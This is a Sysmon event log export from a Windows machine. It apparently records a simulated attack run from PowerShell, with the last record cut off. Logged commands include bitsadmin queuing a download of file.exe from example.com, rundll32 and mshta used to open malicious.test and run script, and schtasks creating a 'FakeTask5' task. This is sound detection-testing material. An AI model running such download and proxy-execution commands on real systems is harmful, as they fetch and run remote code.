"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:19.306
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 57055
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 172.64.41.3
DestinationHostname: -
DestinationPort: 443
DestinationPortName: https"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:19.246
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 53725
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.1.1.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:19.246
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 49284
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.1.1.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:19.245
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 58205
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.1.1.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:48 PM","22","Information","Dns query:
RuleName: -
UtcTime: 2025-11-27 18:03:18.451
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
QueryName: malicious.test
QueryStatus: 9003
QueryResults: -
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:48 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:48.677
ProcessGuid: {3a35410f-9284-6928-0c11-000000000b00}
ProcessId: 8876
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /addfile job5 http://example.com/file.exe C:\Temp\file5.exe 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:48 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:48.558
ProcessGuid: {3a35410f-9284-6928-0a11-000000000b00}
ProcessId: 10044
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /create job5 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:19.084
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 57050
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 8.8.4.4
DestinationHostname: dns.google
DestinationPort: 443
DestinationPortName: https"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:19.076
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 57051
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 8.8.4.4
DestinationHostname: dns.google
DestinationPort: 443
DestinationPortName: https"
"11/27/2025 11:33:48 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:48.505
ProcessGuid: {3a35410f-9284-6928-0811-000000000b00}
ProcessId: 14096
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /delete /tn FakeTask5 /f 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:48 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:48.432
ProcessGuid: {3a35410f-9284-6928-0611-000000000b00}
ProcessId: 10452
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /create /tn FakeTask5 /tr notepad.exe /sc once /st 23:59 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:48 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:48.400
ProcessGuid: {3a35410f-9284-6928-0511-000000000b00}
ProcessId: 11844
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/5 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=5A43032AEBD51583832EF3E96F5C81DA,SHA256=076592CA1957F8F357CC201F0015072C612F5770AD7DE85F87F254253C754DD7,IMPHASH=F207A867D6098266EE63A3CA677EB0FF
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:18.687
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 49300
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.1.1.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:18.686
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 53268
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.1.1.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:18.685
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 59059
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.1.1.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:18.685
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 57551
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.1.1.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:18.684
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 58267
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.1.1.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:18.684
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 57443
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.1.1.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:18.683
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 54608
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.0.0.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:18.683
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 54018
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.0.0.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:18.682
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 49491
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.0.0.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:18.682
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 56146
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.0.0.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:18.681
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 64245
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.0.0.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:18.681
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 49774
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.0.0.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:18.680
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 60733
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.1.1.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:18.680
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 59658
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.1.1.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:18.679
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 53807
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.1.1.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:18.679
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 63546
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.1.1.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:18.678
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 53501
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.1.1.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:18.676
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 62742
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.1.1.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:48 PM","11","Information","File created:
RuleName: -
UtcTime: 2025-11-27 18:03:48.106
ProcessGuid: {3a35410f-9283-6928-fe10-000000000b00}
ProcessId: 13408
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_kxvjf5fr.bd2.ps1
CreationUtcTime: 2025-11-27 18:03:48.106
User: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:18.296
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 63842
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.1.1.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:17.268
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 51069
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 8.8.8.8
DestinationHostname: dns.google
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:47 PM","8","Information","CreateRemoteThread detected:
RuleName: -
UtcTime: 2025-11-27 18:03:47.695
SourceProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
SourceProcessId: 4396
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGuid: {3a35410f-9283-6928-0411-000000000b00}
TargetProcessId: 12956
TargetImage: <unknown process>
NewThreadId: 6916
StartAddress: 0x00007FF6970C30D0
StartModule: -
StartFunction: -
SourceUser: DESKTOP-EJG8QJC\Emil Jinu
TargetUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:47 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:47.534
ProcessGuid: {3a35410f-9283-6928-0311-000000000b00}
ProcessId: 3676
Image: C:\Windows\System32\mshta.exe
FileVersion: 11.00.19041.5794 (WinBuild.160101.0800)
Description: Microsoft (R) HTML Application host
Product: Internet Explorer
Company: Microsoft Corporation
OriginalFileName: MSHTA.EXE
CommandLine: ""C:\Windows\system32\mshta.exe"" javascript:alert('test5') 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=B8ED3F707000C22AEE6BBF961879EA99,SHA256=F8A2FD36FDC35AA8E7E678576A2ECC5D7B3FE6383E73101508E5D7B49443D153,IMPHASH=482D661ACB78B36340AF7BEB797951EE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:47 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:47.504
ProcessGuid: {3a35410f-9283-6928-0211-000000000b00}
ProcessId: 7380
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=renderer --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --disable-gpu-compositing --video-capture-use-gpu-memory-buffer --lang=en-US --device-scale-factor=1 --num-raster-threads=2 --enable-main-frame-before-activation --renderer-client-id=12 --time-ticks-at-unix-epoch=-1764255096121325 --launch-time-ticks=11531768224 --metrics-shmem-handle=5032,i,13518024071006376411,9943362722017472589,2097152 --field-trial-handle=2116,i,4317584078096433513,18029839939329323353,262144 --variations-seed-version=main@69c2005032bb14f803911c3458ab063c42bfa450 --trace-process-track-uuid=3190708997556373682 --mojo-platform-channel-handle=4236 /prefetch:1
CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\142.1.84.141\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-c9e6-200000000000}
LogonId: 0x20E6C9
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-927d-6928-c610-000000000b00}
ParentProcessId: 11048
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --disable-domain-reliability --enable-dom-distiller --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --lso-url=https://no-thanks.invalid --variations-server-url=https://variations.brave.com/seed --variations-insecure-server-url=https://variations.brave.com/seed --flag-switches-begin --flag-switches-end --component-updater=url-source=https://go-updater.brave.com/extensions --do-not-de-elevate --single-argument http://malicious.test/1
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:47 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:47.345
ProcessGuid: {3a35410f-9283-6928-0111-000000000b00}
ProcessId: 11564
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=crashpad-handler ""--user-data-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" /prefetch:4 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data\Crashpad"" ""--metrics-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" --url=https://cr.brave.com --annotation=plat=Win64 --annotation=prod=Brave --annotation=ver=142.1.84.141 --initial-client-data=0x12c,0x130,0x134,0xfc,0x138,0x7ffd9b025a28,0x7ffd9b025a34,0x7ffd9b025a40
CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-9283-6928-0011-000000000b00}
ParentProcessId: 10828
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/4
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:47 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:47.285
ProcessGuid: {3a35410f-9283-6928-0011-000000000b00}
ProcessId: 10828
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/4
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
